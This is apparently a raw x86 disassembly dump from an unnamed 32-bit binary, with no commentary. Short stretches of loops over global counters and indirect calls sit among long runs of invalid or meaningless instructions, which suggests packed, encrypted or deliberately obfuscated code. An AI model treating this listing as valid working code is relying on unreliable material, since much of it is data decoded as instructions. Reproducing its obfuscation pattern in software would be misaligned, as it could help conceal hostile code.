  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e80b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fdd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fdd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fdd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fdd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e2e7
  40e8ca:	call   DWORD PTR ds:0x42e57f
  40e8d0:	cmp    DWORD PTR ds:0x42fdd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fdd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe8a
  40e8f8:	adc    DWORD PTR ds:0x42e7ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e7f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e7fb,0x42e7ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fe01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fe0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e80b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	retf   0xe260
  40e94c:	xchg   esp,eax
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8fa
  40e956:	in     eax,0x40
  40e958:	sub    BYTE PTR [eax-0x8ae1bd9],ah
  40e95e:	pushf  
  40e95f:	xor    eax,ebp
  40e961:	inc    ebp
  40e962:	cld    
  40e963:	cmp    al,0x6d
  40e965:	jnp    0x40e911
  40e967:	test   BYTE PTR [edi-0x25393a8f],0x17
  40e96e:	mov    edx,0x3a04189c
  40e973:	xor    ebx,DWORD PTR [eax+0x15ab4f30]
  40e979:	pop    eax
  40e97a:	ja     0x40e908
  40e97c:	xor    al,0x6f
  40e97e:	fs mov dl,0x24
  40e981:	pop    ds
  40e982:	test   BYTE PTR [ebx],bh
  40e984:	pushf  
  40e985:	or     dh,BYTE PTR [esp+ecx*8]
  40e988:	not    BYTE PTR [edi-0x2d70acc1]
  40e98e:	in     al,dx
  40e98f:	adc    cl,BYTE PTR [ecx-0x53f6505f]
  40e995:	cmp    ebp,eax
  40e997:	sub    BYTE PTR [edx+0x4f1dfa4],ch
  40e99d:	(bad)  
  40e99e:	or     BYTE PTR cs:[edx],0x4
  40e9a2:	or     BYTE PTR [edi+0xf],dh
  40e9a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9a6:	test   eax,0x8533a14
  40e9ab:	pushf  
  40e9ac:	jo     0x40e9c3
  40e9ae:	adc    eax,0xeece59eb
  40e9b3:	ret    
  40e9b4:	pop    esi
  40e9b5:	pop    ebp
  40e9b6:	sbb    al,0x0
  40e9b8:	repnz scas al,BYTE PTR es:[edi]
  40e9ba:	add    BYTE PTR [eax+0x7a],al
  40e9bd:	jae    0x40e9ca
  40e9bf:	and    edx,esi
  40e9c1:	jo     0x40e9c8
  40e9c3:	push   eax
  40e9c4:	add    cl,BYTE PTR ds:0x72d764d2
  40e9ca:	and    al,0x5c
  40e9cc:	fwait
  40e9cd:	popa   
  40e9ce:	mov    al,0x33
  40e9d0:	rcl    DWORD PTR [ecx+0x5bd398f4],cl
  40e9d6:	xchg   edx,eax
  40e9d7:	scas   eax,DWORD PTR es:[edi]
  40e9d8:	inc    esi
  40e9d9:	test   eax,0xe7d073b7
  40e9de:	pop    ecx
  40e9df:	xchg   edx,eax
  40e9e0:	xchg   esp,eax
  40e9e1:	sub    DWORD PTR [edi+ebx*4],ecx
  40e9e4:	rol    DWORD PTR [edx-0x56],0xd
  40e9e8:	lahf   
  40e9e9:	(bad)  
  40e9ea:	push   ecx
  40e9eb:	inc    ebp
  40e9ec:	inc    edi
  40e9ed:	mov    edi,0xe3ffdf2d
  40e9f2:	stc    
  40e9f3:	nop
  40e9f4:	sbb    ecx,0x50c1a247
  40e9fa:	push   ds
  40e9fb:	inc    ebp
  40e9fc:	lea    ebx,[edx+0x75]
  40e9ff:	jle    0x40ea0a
  40ea01:	data16 je 0x40e9a8
  40ea04:	out    dx,eax
  40ea05:	cwde   
  40ea06:	xor    bh,BYTE PTR [edi]
  40ea08:	xlat   BYTE PTR ds:[ebx]
  40ea09:	fldenv [edi+0x31207f04]
  40ea0f:	imul   eax,DWORD PTR ss:[eax],0xffffffff
  40ea13:	inc    ebp
  40ea14:	arpl   WORD PTR [esi+esi*2+0x3e],cx
  40ea18:	push   0x1a68a135
  40ea1d:	test   al,0xe0
  40ea1f:	and    ebx,DWORD PTR [ebp-0x6026af63]
  40ea25:	in     eax,dx
  40ea26:	sbb    bh,BYTE PTR [ecx]
  40ea28:	pop    edx
  40ea29:	pop    ebx
  40ea2a:	xlat   BYTE PTR ds:[ebx]
  40ea2b:	inc    ebp
  40ea2c:	cmp    bh,BYTE PTR [ecx+0x54dd4831]
  40ea32:	lods   al,BYTE PTR ds:[esi]
  40ea33:	dec    DWORD PTR [eax-0x1577dd50]
  40ea39:	inc    ecx
  40ea3a:	sbb    eax,0xa69c99e3
  40ea3f:	push   edx
  40ea40:	dec    ebx
  40ea41:	cs popa 
  40ea43:	mov    al,bl
  40ea45:	mov    al,0xec
  40ea47:	in     eax,0xe6
  40ea49:	xlat   BYTE PTR ds:[ebx]
  40ea4a:	cdq    
  40ea4b:	cmp    al,0xc0
  40ea4d:	add    DWORD PTR [esi-0x7f6bdf61],ecx
  40ea53:	nop
  40ea54:	jecxz  0x40ea25
  40ea56:	mov    esp,0xe6ad3e2
  40ea5b:	xor    eax,0xc9ca2a1f
  40ea60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea61:	mov    dl,BYTE PTR [edi-0x1b]
  40ea64:	xlat   BYTE PTR ds:[ebx]
  40ea65:	inc    esi
  40ea66:	push   0x1178c0b3
  40ea6b:	mov    esi,0xc1e968a3
  40ea70:	rcl    BYTE PTR [ebx-0x19],cl
  40ea73:	loop   0x40ea32
  40ea75:	sar    DWORD PTR [ebx+0x38],1
  40ea78:	jnp    0x40ea8d
  40ea7a:	and    ah,ch
  40ea7c:	sbb    ebp,DWORD PTR [eax+ebp*8+0x49]
  40ea80:	es icebp 
  40ea82:	or     al,BYTE PTR [ecx+0x1c5e3a77]
  40ea88:	shl    DWORD PTR [ebx+0x3d],0x29
  40ea8c:	kxnorb k5,k1,k1
  40ea90:	sbb    esi,DWORD PTR [ebx]
  40ea92:	push   esi
  40ea93:	or     BYTE PTR [ebp-0x233ef106],ch
  40ea99:	cmp    eax,0xafc7db1d
  40ea9e:	out    dx,eax
  40ea9f:	or     eax,ebx
  40eaa1:	jae    0x40eab2
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfd
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e228,0x11
  40eade:	cmp    DWORD PTR ds:0x42e228,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e228,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e230
  40eafd:	push   0x42e26f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e40f
  40eb15:	cmp    DWORD PTR ds:0x42e228,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e228
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e228,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e228
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e228,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xd
  40eb8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb8e:	dec    esi
  40eb8f:	out    dx,al
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	pop    eax
  40eb9a:	lds    edx,FWORD PTR [ecx-0x28]
  40eb9d:	pop    esi
  40eb9e:	mov    edi,DWORD PTR ds:0x23148705
  40eba4:	add    DWORD PTR [ebp-0x7d],edx
  40eba7:	call   0xe0d3:0x170214f
  40ebae:	jl     0x40ebda
  40ebb0:	add    eax,0x72c52bb9
  40ebb5:	retf   0x2aba
  40ebb8:	or     al,0x88
  40ebba:	js     0x40ebb7
  40ebbc:	gs and eax,0x775ebc6f
  40ebc2:	pop    ebx
  40ebc3:	lds    edx,FWORD PTR [esi-0xc]
  40ebc6:	loopne 0x40ebe1
  40ebc8:	mov    ch,0xb2
  40ebca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebcb:	adc    esp,ebx
  40ebcd:	inc    edi
  40ebce:	fist   DWORD PTR [edi+0x3743d97d]
  40ebd4:	dec    ebp
  40ebd5:	inc    esp
  40ebd6:	push   esp
  40ebd7:	lods   al,BYTE PTR ds:[esi]
  40ebd8:	call   0x841fdc0f
  40ebdd:	inc    ecx
  40ebde:	dec    edx
  40ebdf:	inc    esi
  40ebe0:	sbb    DWORD PTR ds:0x96b4d5ca,0xa73f3acc
  40ebea:	push   ebp
  40ebeb:	repnz leave 
  40ebed:	aaa    
  40ebee:	mov    bl,0xe6
  40ebf0:	mov    bh,0x71
  40ebf2:	or     eax,0x92cbae58
  40ebf7:	sti    
  40ebf8:	clc    
  40ebf9:	shr    DWORD PTR [ebx+0x63],0x13
  40ebfd:	jmp    0x95dc:0xeae4a86e
  40ec04:	add    ch,BYTE PTR [ebp+0x2087c8a4]
  40ec0a:	ds push ebp
  40ec0c:	ret    0x537e
  40ec0f:	sbb    DWORD PTR [ebx],edi
  40ec11:	or     cl,BYTE PTR [eax+0xf]
  40ec14:	out    0xde,eax
  40ec16:	loope  0x40ebe5
  40ec18:	mov    edi,0x125eb109
  40ec1d:	mov    ecx,0xe4e53dc4
  40ec22:	jo     0x40ec9c
  40ec24:	pop    ebp
  40ec25:	cmp    al,0x8
  40ec27:	inc    ecx
  40ec28:	loope  0x40eca4
  40ec2a:	cbw    
  40ec2c:	loope  0x40ebb5
  40ec2e:	mov    al,ds:0x6b6c32c2
  40ec33:	arpl   si,si
  40ec35:	icebp  
  40ec36:	inc    esi
  40ec37:	add    DWORD PTR [ebx+0x1c],edx
  40ec3a:	mov    esp,0xb34838f7
  40ec3f:	inc    eax
  40ec40:	and    al,0x44
  40ec42:	mov    al,ds:0x528df887
  40ec47:	cwde   
  40ec48:	inc    esp
  40ec49:	pop    eax
  40ec4a:	cmp    eax,0xd5a31544
  40ec4f:	push   cs
  40ec50:	mov    eax,0xde0443ef
  40ec55:	idiv   DWORD PTR [ebx+0x6c06881d]
  40ec5b:	mov    BYTE PTR [eax],al
  40ec5d:	das    
  40ec5e:	test   eax,0x27efde54
  40ec63:	popf   
  40ec64:	sub    BYTE PTR [edx-0x183c69dc],ch
  40ec6a:	add    eax,0x4dead60d
  40ec6f:	cs int 0xee
  40ec72:	retf   0xd48
  40ec75:	(bad)  
  40ec76:	adc    BYTE PTR [ebx],ah
  40ec78:	stos   DWORD PTR es:[edi],eax
  40ec79:	mov    al,0x26
  40ec7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec7c:	dec    ecx
  40ec7d:	not    DWORD PTR [ebp-0x4537f67d]
  40ec83:	pushf  
  40ec84:	jae    0x40ec14
  40ec86:	add    ebp,DWORD PTR [ebx-0x714955bb]
  40ec8c:	mov    esp,0x635d680a
  40ec91:	fnstenv [bp+si]
  40ec94:	push   esi
  40ec95:	pop    esi
  40ec96:	out    dx,al
  40ec97:	cli    
  40ec98:	call   0x684f:0x87394f19
  40ec9f:	xchg   ecx,eax
  40eca0:	imul   esp,edi,0x78
  40eca3:	push   ebx
  40eca4:	outs   dx,BYTE PTR es:[esi]
  40eca6:	push   ss
  40eca7:	pop    esi
  40eca8:	dec    ecx
  40eca9:	pop    es
  40ecaa:	pxor   mm2,mm0
  40ecad:	inc    eax
  40ecae:	inc    ebp
  40ecaf:	fdivr  st,st(7)
  40ecb1:	in     eax,dx
  40ecb2:	hlt    
  40ecb3:	xchg   ebx,eax
  40ecb4:	and    esp,edx
  40ecb6:	jg     0x40ecb6
  40ecb8:	mov    ah,0x10
  40ecba:	(bad)  [edi-0x148a256b]
  40ecc0:	dec    ebp
  40ecc1:	in     eax,dx
  40ecc2:	jge    0x40ecb3
  40ecc4:	or     eax,0x2213b732
  40ecc9:	xor    BYTE PTR [ebx],dl
  40eccb:	fwait
  40eccc:	pop    ss
  40eccd:	mov    ch,0x26
  40eccf:	clc    
  40ecd0:	inc    esi
  40ecd1:	xlat   BYTE PTR ds:[ebx]
  40ecd2:	lahf   
  40ecd3:	ins    DWORD PTR es:[edi],dx
  40ecd4:	out    0xe9,al
  40ecd6:	iret   
  40ecd7:	fsub   st(6),st
  40ecd9:	xor    bl,BYTE PTR [ebp+0x16]
  40ecdc:	sub    eax,0xbcc056be
  40ece1:	xor    edi,ecx
  40ece3:	and    bl,bh
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecca
  40ed00:	ret    
  40ed01:	mov    ecx,gs
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed04
  40ed0c:	sub    esi,edx
  40ed0e:	out    dx,eax
  40ed0f:	fsubr  QWORD PTR [ebp+0x5]
  40ed12:	inc    esi
  40ed13:	sub    esi,ebp
  40ed15:	ja     0x40ed3d
  40ed17:	mov    ebp,0x34d68387
  40ed1c:	dec    edx
  40ed1e:	test   DWORD PTR [edx],ecx
  40ed20:	jmp    0x433e:0x48afe2c7
  40ed27:	cmp    eax,0x213e4b25
  40ed2c:	(bad)  
  40ed2d:	adc    ch,al
  40ed2f:	jns    0x40eda1
  40ed31:	push   edx
  40ed32:	mov    cl,0x54
  40ed34:	sub    bh,bh
  40ed36:	mov    cl,0x13
  40ed38:	adc    bl,al
  40ed3a:	or     eax,0x1e506436
  40ed3f:	mov    ch,0xdf
  40ed41:	add    eax,0xf03973a0
  40ed46:	scas   eax,DWORD PTR es:[edi]
  40ed47:	push   esi
  40ed48:	iret   
  40ed49:	sbb    DWORD PTR [edi],ebp
  40ed4b:	and    DWORD PTR [ebx+ebp*4],0xf8af7dfa
  40ed52:	sub    edi,DWORD PTR [eax-0x51]
  40ed55:	inc    edx
  40ed56:	and    BYTE PTR [eax+0x31],ch
  40ed59:	push   esi
  40ed5a:	push   es
  40ed5b:	imul   ebx,esi,0xe6d36d75
  40ed61:	sbb    edx,DWORD PTR [ebx+ecx*2+0xd693914]
  40ed68:	(bad)  
  40ed69:	sti    
  40ed6a:	sbb    bh,BYTE PTR ds:[edx]
  40ed6d:	out    0x51,al
  40ed6f:	jns    0x40ed4c
  40ed71:	jmp    DWORD PTR [ecx]
  40ed73:	cdq    
  40ed74:	mov    bl,cl
  40ed76:	aad    0xb2
  40ed78:	popf   
  40ed79:	dec    eax
  40ed7a:	mov    al,ds:0x2f30f059
  40ed7f:	out    dx,eax
  40ed80:	iret   
  40ed81:	cmp    BYTE PTR [esi],al
  40ed83:	add    DWORD PTR [esp+ecx*1],edx
  40ed86:	xchg   ebp,eax
  40ed87:	push   ebp
  40ed88:	jae    0x40ed73
  40ed8a:	push   edx
  40ed8b:	mov    dh,0x3c
  40ed8d:	fwait
  40ed8e:	or     ebp,esp
  40ed90:	data16 stos BYTE PTR es:[edi],al
  40ed92:	imul   edi,edx,0x66
  40ed95:	jl     0x40ed4a
  40ed97:	ins    BYTE PTR es:[edi],dx
  40ed98:	in     al,dx
  40ed99:	and    edx,ebx
  40ed9b:	sar    DWORD PTR [esp+ebp*8-0x69ecff27],0x53
  40eda3:	adc    eax,DWORD PTR [ebp-0x64534fd3]
  40eda9:	mov    edx,0xc257ba34
  40edae:	iret   
  40edaf:	fwait
  40edb0:	icebp  
  40edb1:	dec    ebp
  40edb2:	in     al,0xc4
  40edb4:	ds inc esp
  40edb6:	call   0x3af4:0x4f646fa
  40edbd:	mov    ch,0x1b
  40edbf:	mov    eax,ds:0xfed0a409
  40edc4:	ret    
  40edc5:	fbstp  TBYTE PTR [edx-0x5633dd5b]
  40edcb:	je     0x40ee39
  40edcd:	mov    esp,DWORD PTR [edx+0x32dd085e]
  40edd3:	jmp    0x40edd5
  40edd5:	scas   eax,DWORD PTR es:[edi]
  40edd6:	pop    ebp
  40edd7:	xor    BYTE PTR [edi],bh
  40edd9:	inc    edi
  40edda:	imul   ebp,DWORD PTR [eax+0x502d1c1c],0xc0b16394
  40ede4:	xor    bh,bl
  40ede6:	scas   al,BYTE PTR es:[edi]
  40ede7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ede8:	or     eax,0xd173cf6a
  40eded:	in     al,0xd1
  40edef:	sub    BYTE PTR [eax+edi*2-0x60f83971],bl
  40edf6:	dec    edi
  40edf7:	scas   eax,DWORD PTR es:[edi]
  40edf8:	add    bl,BYTE PTR [edx+0x34]
  40edfb:	call   0xa9da:0xe9d8e248
  40ee02:	adc    eax,0xa72b80de
  40ee07:	jno    0x40edcc
  40ee09:	fs mov eax,0xa9da06a
  40ee0f:	loop   0x40ee17
  40ee11:	and    DWORD PTR [esi+0x1a8f78b0],ebp
  40ee17:	outs   dx,BYTE PTR ds:[esi]
  40ee18:	mov    edx,0x7201d1f3
  40ee1d:	xchg   edi,eax
  40ee1e:	push   ebx
  40ee1f:	popf   
  40ee20:	mov    ch,0xab
  40ee22:	push   ebx
  40ee23:	idiv   DWORD PTR [edi+0x1f10b52c]
  40ee29:	dec    ebp
  40ee2a:	jb     0x40ee1f
  40ee2c:	mov    ?,WORD PTR [edx-0x42]
  40ee2f:	or     al,0x79
  40ee31:	or     eax,0x48b6ed58
  40ee36:	into   
  40ee37:	push   cs
  40ee38:	or     eax,0x59b14553
  40ee3d:	fisub  DWORD PTR [edx]
  40ee3f:	stos   DWORD PTR es:[edi],eax
  40ee40:	mov    WORD PTR [ecx+0x508a170f],?
  40ee46:	aaa    
  40ee47:	add    eax,0x43fbd33
  40ee4c:	dec    ebx
  40ee4d:	rcl    al,1
  40ee4f:	jecxz  0x40ee76
  40ee51:	iret   
  40ee52:	cmp    DWORD PTR [edi-0x3c7eeae4],ebx
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xff
  40ee7f:	cmp    DWORD PTR [eax+0x2f],eax
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee92
  40ee8b:	cmp    edx,DWORD PTR [edx-0x1fe543a9]
  40ee91:	xor    al,0xc0
  40ee93:	xor    al,0x50
  40ee95:	jb     0x40eef9
  40ee97:	fmul   DWORD PTR [edx+0x78f4c091]
  40ee9d:	inc    ebp
  40ee9e:	sbb    bh,bh
  40eea0:	mov    eax,ds:0x81121375
  40eea5:	pop    ebp
  40eea6:	mov    dh,cl
  40eea8:	mov    BYTE PTR [edx+0xc],cl
  40eeab:	mov    cl,0x8f
  40eead:	std    
  40eeae:	pop    ebx
  40eeaf:	adc    al,0xc4
  40eeb1:	mov    bl,ah
  40eeb3:	and    DWORD PTR ss:[ecx-0x15fe854e],edi
  40eeba:	rcl    BYTE PTR [eax-0x29],cl
  40eebd:	repz xchg ebx,eax
  40eebf:	jl     0x40ee52
  40eec1:	xchg   edx,eax
  40eec2:	lea    edi,[eax-0xf061358]
  40eec8:	xchg   esi,eax
  40eec9:	jecxz  0x40ee6a
  40eecb:	push   ebp
  40eecc:	imul   DWORD PTR [ecx-0x6c]
  40eecf:	jle    0x40eef9
  40eed1:	push   esp
  40eed2:	push   ds
  40eed3:	scas   al,BYTE PTR es:[edi]
  40eed4:	call   0x6853:0x46f7c967
  40eedb:	sbb    eax,0xf10e721b
  40eee0:	jg     0x40ee72
  40eee2:	arpl   WORD PTR [ecx],bx
  40eee4:	push   ecx
  40eee5:	aam    0xc4
  40eee7:	dec    ebx
  40eee8:	mov    ds:0x28e5dd45,al
  40eeed:	ret    0x309c
  40eef0:	je     0x40ef22
  40eef2:	out    dx,al
  40eef3:	cmp    ebx,DWORD PTR [esi+0x4d]
  40eef6:	js     0x40ef2c
  40eef8:	mov    eax,0x1939120
  40eefd:	mov    edi,0xf2cc7941
  40ef02:	sub    BYTE PTR [ebx+0x50c1db7d],al
  40ef08:	cmp    al,0x7e
  40ef0a:	mov    dh,0x20
  40ef0c:	repz (bad)
  40ef0f:	test   al,0x27
  40ef11:	pop    eax
  40ef12:	mov    ?,WORD PTR [edi]
  40ef14:	jmp    0x40eebf
  40ef16:	fnsave [ecx+edi*8+0x3b6ee631]
  40ef1d:	loop   0x40ef8e
  40ef1f:	stos   DWORD PTR es:[edi],eax
  40ef20:	aad    0x50
  40ef22:	jmp    0xf89db09b
  40ef27:	or     edx,DWORD PTR [edi+0x13699451]
  40ef2d:	push   edi
  40ef2e:	in     eax,0xc9
  40ef30:	adc    esi,edx
  40ef32:	or     bl,dh
  40ef34:	jecxz  0x40efac
  40ef36:	add    esi,DWORD PTR [eax]
  40ef38:	push   ds
  40ef39:	test   al,0x2c
  40ef3b:	jo     0x40eede
  40ef3d:	fld    TBYTE PTR [edi+0x6ea407f2]
  40ef43:	rcl    BYTE PTR [edx+0x1d],cl
  40ef46:	paddw  mm0,mm7
  40ef49:	adc    DWORD PTR [esi],ebx
  40ef4b:	add    BYTE PTR [ecx],0xd7
  40ef4e:	sub    DWORD PTR [eax-0x4a],ebp
  40ef51:	shl    ah,0x70
  40ef54:	jae    0x40ef06
  40ef56:	sahf   
  40ef57:	fdivr  st,st(6)
  40ef59:	repz or DWORD PTR [edx-0x15],0xce1fc1ba
  40ef61:	pop    esp
  40ef62:	iret   
  40ef63:	mov    eax,ds:0xd4f0c632
  40ef68:	push   0xffffffec
  40ef6a:	fpatan 
  40ef6c:	add    BYTE PTR [edi*4+0x603902f8],dh
  40ef73:	push   ecx
  40ef74:	pop    ds
  40ef75:	push   ss
  40ef76:	jns    0x40ef48
  40ef78:	out    dx,eax
  40ef79:	(bad)  
  40ef7b:	aad    0x69
  40ef7d:	shr    BYTE PTR [edi+0x39],0x12
  40ef81:	push   0xffffffe6
  40ef83:	stos   DWORD PTR es:[edi],eax
  40ef84:	fs das 
  40ef86:	inc    esi
  40ef87:	pusha  
  40ef88:	jnp    0x40effb
  40ef8a:	shr    DWORD PTR [edx+0x460afa0f],1
  40ef90:	jb     0x40ef23
  40ef92:	dec    edi
  40ef93:	outs   dx,BYTE PTR ds:[esi]
  40ef94:	push   ss
  40ef95:	pop    eax
  40ef96:	inc    ecx
  40ef97:	dec    edi
  40ef98:	or     DWORD PTR [esi],esp
  40ef9a:	add    esi,DWORD PTR [esi]
  40ef9c:	imul   esp,DWORD PTR [eax-0x67],0xbf501eb0
  40efa3:	xchg   ebx,eax
  40efa4:	xchg   ecx,eax
  40efa5:	in     eax,dx
  40efa6:	inc    ecx
  40efa7:	sub    eax,0x11224de4
  40efac:	shl    ah,1
  40efae:	out    0xb2,eax
  40efb0:	pop    eax
  40efb1:	push   ds
  40efb2:	jne    0x40effb
  40efb4:	adc    bl,BYTE PTR [ebx+0x35]
  40efb7:	pop    ecx
  40efb8:	inc    esp
  40efb9:	xchg   esi,eax
  40efba:	dec    edi
  40efbb:	pop    ebp
  40efbc:	xchg   BYTE PTR [edi+0x50a12c27],bh
  40efc2:	fisttp WORD PTR [ebx+0x62]
  40efc5:	sbb    edi,DWORD PTR [eax-0x40619712]
  40efcb:	clc    
  40efcc:	repnz iret 
  40efce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efcf:	xchg   ecx,eax
  40efd0:	lahf   
  40efd1:	sub    BYTE PTR [esi-0x5dab2c75],0x33
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	xchg   ah,ah
  40effc:	ds xor eax,edx
  40efff:	stos   DWORD PTR es:[edi],eax
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40eff8
  40f007:	push   cs
  40f008:	scas   eax,DWORD PTR es:[edi]
  40f009:	cmp    al,BYTE PTR [esi+eiz*1]
  40f00c:	imul   ebx,ebp,0xffffffbb
  40f00f:	sbb    ah,cl
  40f011:	cli    
  40f012:	pop    edx
  40f013:	ss push esi
  40f015:	into   
  40f016:	pop    edx
  40f017:	pop    es
  40f018:	add    al,0x77
  40f01a:	inc    ebp
  40f01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f01c:	sti    
  40f01d:	pop    edx
  40f01e:	sar    DWORD PTR [ebp-0x3e],1
  40f021:	mov    al,ds:0xc5825d53
  40f026:	ret    0xd6f4
  40f029:	ins    BYTE PTR es:[edi],dx
  40f02a:	jge    0x40f036
  40f02c:	test   eax,0xcc6d2861
  40f031:	add    BYTE PTR [ebx+eiz*4-0x789997d3],bh
  40f038:	mov    BYTE PTR ds:0x370b446,bl
  40f03e:	stc    
  40f03f:	xor    BYTE PTR [ebx-0x2f18e956],ah
  40f045:	ror    BYTE PTR [ebp+0x14fb79ed],cl
  40f04b:	inc    eax
  40f04c:	mov    dl,BYTE PTR [eax+0xb]
  40f04f:	leave  
  40f050:	pop    ebx
  40f051:	(bad)  
  40f052:	stos   BYTE PTR es:[edi],al
  40f053:	daa    
  40f054:	xchg   esi,eax
  40f055:	bound  ecx,QWORD PTR ds:0xc1ecb801
  40f05b:	inc    esp
  40f05c:	cs sahf 
  40f05e:	and    eax,0x1b09d85d
  40f063:	push   esi
  40f064:	test   eax,ebx
  40f066:	and    BYTE PTR [eax+esi*8-0x63],dl
  40f06a:	cmp    esi,DWORD PTR [esp+edx*1-0x406c92b0]
  40f071:	(bad)  
  40f072:	xchg   esp,eax
  40f073:	add    cl,al
  40f075:	cli    
  40f076:	loop   0x40f01c
  40f078:	push   ebx
  40f079:	inc    edi
  40f07a:	or     eax,0x4823d177
  40f07f:	sbb    DWORD PTR [ecx],esp
  40f081:	repz in al,dx
